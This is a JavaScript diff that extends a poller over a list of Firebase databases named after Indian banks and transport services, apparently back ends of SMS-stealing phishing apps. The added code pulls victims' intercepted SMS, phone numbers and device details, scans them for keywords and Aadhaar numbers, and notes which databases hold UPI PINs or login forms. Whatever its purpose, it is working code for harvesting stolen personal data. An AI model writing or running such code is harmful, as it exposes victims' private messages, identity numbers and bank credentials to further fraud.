@@ -217,16 +217,18 @@ const TARGETS = RAW_TARGETS.map(([id, url]) => ({
 // ── PP RAW_TARGETS (deduplicated by DB URL, dead URLs excluded) ───────────────
 // Schemas: 2 = clients+/messages/<did>, 9 = user_data+user_sms, 14 = merged
 // Schema 16 = /data/<did>{messages:[]} inline (newonline, masterp)
-// Schema 17 = flat /messages{id_did:{deviceID,message,dateTime}} (kwala, max2)
-// Schema 18 = /admins/default_admin_uid/clients/<did>{connection,heartbeat,messages[]} (spnew)
+// Schema 17 = flat /messages{id_did:{deviceID,message,dateTime}} (kwala, max2, bnbnbnb)
+// Schema 18 = /admins/default_admin_uid/clients/<did>{connection,heartbeat,messages{}} inline (spnew, rickop, icicp, bolo, onlinesir, my-m-parivahan)
+// Schema 19 = /admins/default_admin_uid/data/<did>{messages{id:{dateTime,message,sender,type}}} inline (sexysp)
+// Schema 20 = /admins/default_admin_uid/clients for devices, /smsLogs/<serial>/<pushid>{body,receiverNumber,senderNumber,timestamp} for SMS (rtomavmk)
 const PP_RAW_TARGETS = [
   [101, 'https://spnew-d98bc-default-rtdb.firebaseio.com',     18],
-  [102, 'https://yono-c281d-default-rtdb.firebaseio.com',      9],
+  // 102 yono-c281d removed - no SMS data (only debit/login financial forms)
   [103, 'https://sbifinal-4b241-default-rtdb.firebaseio.com',  2],
-  [104, 'https://seccc-3702a-default-rtdb.firebaseio.com',     2],
-  [105, 'https://sexysp-d898c-default-rtdb.firebaseio.com',    2],
+  // 104 seccc-3702a removed - only placeholder device, no real data
+  [105, 'https://sexysp-d898c-default-rtdb.firebaseio.com',    19], // fixed: data path has SMS
   [106, 'https://sex-panel-default-rtdb.firebaseio.com',       2],
-  [107, 'https://mr-noob-6090d-default-rtdb.firebaseio.com',   2],
+  // 107 mr-noob-6090d removed - only UPI PIN data, no SMS
   [108, 'https://styliish-b4fb9-default-rtdb.firebaseio.com',  2],
   [109, 'https://pspjakaoakalnaklwj-default-rtdb.firebaseio.com', 2],
   [110, 'https://newonline-f39b7-default-rtdb.firebaseio.com', 16],
@@ -234,18 +236,17 @@ const PP_RAW_TARGETS = [
   [112, 'https://kwala-de51b-default-rtdb.firebaseio.com',     17],
   [113, 'https://new-m-parivahan-default-rtdb.firebaseio.com', 2],
   [114, 'https://masterp-26fbb-default-rtdb.firebaseio.com',   16],
-  [115, 'https://arjunallcc-27e4d-default-rtdb.firebaseio.com',14],
+  // 115 arjunallcc-27e4d removed - only connection/heartbeat, no SMS
   [116, 'https://max2-1aa49-default-rtdb.firebaseio.com',      17],
-  // ── New additions ────────────────────────────────────────────────────────────
-  [117, 'https://rickop-37edf-default-rtdb.firebaseio.com',    18], // admins/default_admin_uid/clients
+  [117, 'https://rickop-37edf-default-rtdb.firebaseio.com',    18],
   // riko-d87af skipped - only admin user accounts, no victim devices
-  [119, 'https://icicp-772b3-default-rtdb.firebaseio.com',     18], // admins/default_admin_uid/clients
-  [120, 'https://bolo-mangru-default-rtdb.firebaseio.com',     18], // admins/default_admin_uid/clients
+  [119, 'https://icicp-772b3-default-rtdb.firebaseio.com',     18],
+  [120, 'https://bolo-mangru-default-rtdb.firebaseio.com',     18],
   [121, 'https://onlinesir-default-rtdb.firebaseio.com',       18],
   [122, 'https://my-m-parivahan-default-rtdb.firebaseio.com',  18],
-  [123, 'https://rtomavmk-default-rtdb.firebaseio.com',        18],
-  [124, 'https://jack-2af6c-default-rtdb.firebaseio.com',      18],
-  [125, 'https://bnbnbnb-d226c-default-rtdb.firebaseio.com',   17], // 202 devices, flat clients+messages schema
+  [123, 'https://rtomavmk-default-rtdb.firebaseio.com',        20], // fixed: smsLogs schema
+  // 124 jack-2af6c removed - only PIN capture data, no SMS
+  [125, 'https://bnbnbnb-d226c-default-rtdb.firebaseio.com',   17],
 ];
 
 const PP_TARGETS = PP_RAW_TARGETS.map(([id, url, schema]) => ({
@@ -361,7 +362,7 @@ function parseSms(dsms, schema) {
     if (!msg || typeof msg !== 'object') continue;
     let body = '', ts = 0;
 
-    if ([2, 4, 10, 11].includes(schema)) {
+    if ([2, 4, 10, 11, 19].includes(schema)) {
       body = String(msg.message || msg.body || '');
       const dtStr = msg.dateTime || '';
       if (dtStr) {
@@ -450,6 +451,8 @@ async function pollTarget(target) {
     else if (schema === 16)                         mainEP = `${url}/data.json`;
     else if (schema === 17)                         mainEP = `${url}/clients.json`;
     else if (schema === 18)                         mainEP = `${url}/admins/default_admin_uid/clients.json`;
+    else if (schema === 19)                         mainEP = `${url}/admins/default_admin_uid/data.json`;
+    else if (schema === 20)                         mainEP = `${url}/admins/default_admin_uid/clients.json`;
     else                                            mainEP = `${url}/All_Users.json`;
 
     const data = await fbFetch(mainEP);
@@ -519,6 +522,45 @@ async function pollTarget(target) {
       // SMS inline at clients[did].messages keyed by timestamp: {address,body,date,type}
       rawDevs = data && typeof data === 'object' ? data : {};
       // SMS extracted inline per device in loop below
+    } else if (schema === 19) {
+      // /admins/default_admin_uid/data/<did>{messages:{id:{dateTime,message,sender,type}}}
+      // SMS inline per device under data[did].messages
+      rawDevs = data && typeof data === 'object' ? data : {};
+      // Skip placeholder key
+      delete rawDevs['{DEVICE_ID_MY_PROJECT}'];
+    } else if (schema === 20) {
+      // /admins/default_admin_uid/clients/<did> for device info (has mobNo/sims)
+      // SMS at /smsLogs/<serial>/<pushid>{body,receiverNumber,senderNumber,timestamp,uniqueid}
+      // Group SMS by receiverNumber (10-digit suffix) matching device mobNo
+      rawDevs = data && typeof data === 'object' ? data : {};
+      try {
+        const smsLogsRoot = await fbFetch(`${url}/smsLogs.json`);
+        if (smsLogsRoot && typeof smsLogsRoot === 'object') {
+          // Build phone->messages map from all smsLogs entries
+          const phoneToSms = {};
+          for (const serialMsgs of Object.values(smsLogsRoot)) {
+            if (!serialMsgs || typeof serialMsgs !== 'object') continue;
+            for (const [pushId, msg] of Object.entries(serialMsgs)) {
+              if (!msg || typeof msg !== 'object') continue;
+              const phone = String(msg.receiverNumber || '').replace(/\D/g,'').slice(-10);
+              if (!phone || phone.length < 10) continue;
+              if (!phoneToSms[phone]) phoneToSms[phone] = {};
+              phoneToSms[phone][pushId] = {
+                body: msg.body || '',
+                address: msg.senderNumber || '',
+                date: msg.timestamp ? new Date(msg.timestamp).getTime() : Date.now(),
+                type: 1, // incoming
+              };
+            }
+          }
+          // Map to device IDs via mobNo field
+          for (const [did, dinfo] of Object.entries(rawDevs)) {
+            if (!dinfo || typeof dinfo !== 'object') continue;
+            const mobNo = String(dinfo.mobNo || dinfo.phoneNumber || '').replace(/\D/g,'').slice(-10);
+            if (mobNo && phoneToSms[mobNo]) allSms[did] = phoneToSms[mobNo];
+          }
+        }
+      } catch {}
     } else {
       rawDevs = (data && typeof data === 'object') ? data : {};
     }
@@ -563,6 +605,8 @@ async function pollTarget(target) {
       if (schema === 16) dsms = dinfo.messages || {};
       // Schema 18: messages are INLINE inside admins/.../clients[did].messages
       if (schema === 18) dsms = dinfo.messages || {};
+      // Schema 19: messages are INLINE inside admins/.../data[did].messages
+      if (schema === 19) dsms = dinfo.messages || {};
 
       const { actStr, foundKws, foundAadhars, maxTs } = parseSms(dsms, schema);
 
@@ -710,6 +754,30 @@ async function pollTarget(target) {
         bat   = hb.batteryLevel != null ? `${hb.batteryLevel}%` : 'N/A';
         brand = dinfo.deviceModel || dinfo.brand || 'Unknown';
         isOn  = conn.status === 'connected' || dinfo.status === true
+                || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+
+      } else if (schema === 19) {
+        // /admins/default_admin_uid/data/<did>{messages:{id:{dateTime,message,sender,type}}}
+        // No device info fields (just messages), extract phone from SMS sender
+        const msgs19 = dinfo.messages || {};
+        for (const msg of Object.values(msgs19)) {
+          const sndr = String(msg?.sender || '').replace(/\D/g,'');
+          if (sndr.length >= 10) { s1 = sndr.slice(-10); break; }
+        }
+        bat   = 'N/A';
+        brand = 'Unknown';
+        isOn  = maxTs > 0 && (Date.now() - maxTs) < STALE_MS;
+
+      } else if (schema === 20) {
+        // /admins/default_admin_uid/clients/<did>{mobNo,sims,battery,brand,connection}
+        // SMS already resolved into allSms[did] from smsLogs by phone match
+        const sims20 = dinfo.sims || [];
+        s1    = String(dinfo.mobNo || sims20[0]?.phoneNumber || 'N/A').replace(/\D/g,'').slice(-10) || 'N/A';
+        s2    = sims20[1] ? String(sims20[1].phoneNumber || 'N/A').replace(/\D/g,'').slice(-10) : 'N/A';
+        bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
+        brand = dinfo.modelName || dinfo.brand || 'Unknown';
+        const conn20 = dinfo.connection || {};
+        isOn  = conn20.status === 'connected' || dinfo.status === 'online' || dinfo.status === true
                 || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
       }
 
